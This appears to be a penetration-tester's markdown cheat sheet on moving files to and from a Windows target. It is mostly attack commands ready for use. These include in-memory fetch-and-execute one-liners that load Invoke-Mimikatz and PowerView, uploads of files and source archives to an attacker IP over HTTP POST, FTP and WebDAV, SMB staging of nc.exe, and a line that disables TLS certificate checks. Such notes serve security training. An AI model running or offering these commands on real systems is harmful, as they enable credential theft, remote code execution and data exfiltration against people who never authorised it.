# File Transfers

1. [Windows File Transfer Methods](#windows-file-transfer-methods)

## Windows File Transfer Methods

* Download operations: (download to Windows)

  * PowerShell base64 encode & decode:

    * We can encode a file to a base64 string, copy its contents from terminal & perform the reverse operation.

    * To ensure the file is correct, we can use ```md5sum``` to verify the checksum.

    ```shell
    md5sum id_rsa
    # md5 hash of sample ssh key
    # we want to transfer sample ssh key to target Windows machine

    cat id_rsa | base64 -w 0; echo
    # copy this content and paste into PowerShell terminal
    ```

    ```ps
    [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<base64-encoded string>"))
    # decodes and writes to file

    Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
    # confirm hashes match
    ```

  * PowerShell web downloads:

    * In any version of PowerShell, the ```System.Net.WebClient``` class can be used to download a file over HTTP, HTTPS or FTP - there are [multiple WebClient methods](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0).

    ```ps
    (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

    # DownloadFileAsync can be used alternatively
    (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')
    ```

    ```ps
    # fileless method
    # using inbuilt function to download payload and execute it

    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
    # instead of downloading script to disk
    # runs it directly in memory using Invoke-Expression or IEX
    # IEX also accepts pipeline input
    ```

    ```ps
    # Invoke-WebRequest cmdlet can be used
    # aliases - iwr, curl, wget

    Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1

    # can be piped with IEX for fileless
    Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 | IEX

    # if we get an Internet Explorer error, IWR should have -UseBasicParsing flag

    # for SSL/TLS errors, run this command
    # [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
    ```

  * SMB downloads:

    ```shell
    # on attacker machine
    # host SMB server
    sudo impacket-smbserver share -smb2support /tmp/smbshare

    # sometimes, unauthenticated guest access is blocked on Windows
    # so we need to use creds
    sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
    ```

    ```cmd
    # in target Windows machine
    # to copy file from SMB server
    copy \\192.168.220.133\share\nc.exe

    # if we are using creds, mount SMB server & copy
    net use n: \\192.168.220.133\share /user:test test
    copy n:\nc.exe
    ```

  * FTP downloads:

    ```shell
    # on attacker machine
    sudo pip3 install pyftpdlib

    # setup python3 ftp server
    sudo python3 -m pyftpdlib --port 21
    ```

    ```ps
    # on target machine
    (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
    ```

    ```cmd
    # if we do not have an interactive shell
    # we can create an FTP command file to download a file

    echo open 192.168.49.128 > ftpcommand.txt
    echo USER anonymous >> ftpcommand.txt
    echo binary >> ftpcommand.txt
    echo GET file.txt >> ftpcommand.txt
    echo bye >> ftpcommand.txt
    ftp -v -n -s:ftpcommand.txt
    # this downloads the file
    ```

* Upload operations: (upload from Windows)

  * PowerShell base64 encode & decode:

    ```ps
    [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
    # encode file to base64

    Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
    # get md5 hash
    ```

    ```shell
    # in attacker machine
    echo <base64 string> | base64 -d > hosts
    # decode base64 string and store in file

    md5sum hosts
    # hash should match
    ```
  
  * PowerShell web uploads:

    ```shell
    pip3 install uploadserver

    python3 -m uploadserver
    # webserver that hosts a file upload page
    ```

    ```ps
    # we can make use of PSUpload.ps1 script
    # use IWR for upload
    IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

    Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
    # uploads file
    ```

  * PowerShell base64 web upload:

    ```ps
    $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
    # base64-encoding of file
    
    Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
    # send it on attacker machine port
    ```

    ```shell
    nc -lvnp 8000
    # catch the base64 data

    echo <base64 string> | base64 -d -w 0 > hosts
    ```

  * SMB uploads:

    ```shell
    # enterprises usually do not allow SMB protocol out of internal network
    # so we would need to use SMB over HTTP with WebDAV

    # setup WebDAV in attacker machine
    sudo pip install wsgidav cheroot

    sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
    ```

    ```cmd
    # connect to webDAV share
    dir \\192.168.49.128\DavWWWRoot
    # this folder does not actually exist on the attacker machine
    # it is a keyword recognized by Windows Shell to connect to root of webDAV server
    # we can alternatively mention an existing folder

    copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
    copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
    # upload files
    ```

  * FTP uploads:

    ```shell
    sudo python3 -m pyftpdlib --port 21 --write
    # start ftp server with --write
    # to allow clients to upload files
    ```

    ```ps
    (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
    # upload file
    ```

    ```cmd
    # we can also create a command file for client
    echo open 192.168.49.128 > ftpcommand.txt
    echo USER anonymous >> ftpcommand.txt
    echo binary >> ftpcommand.txt
    echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
    echo bye >> ftpcommand.txt
    ftp -v -n -s:ftpcommand.txt
    ```
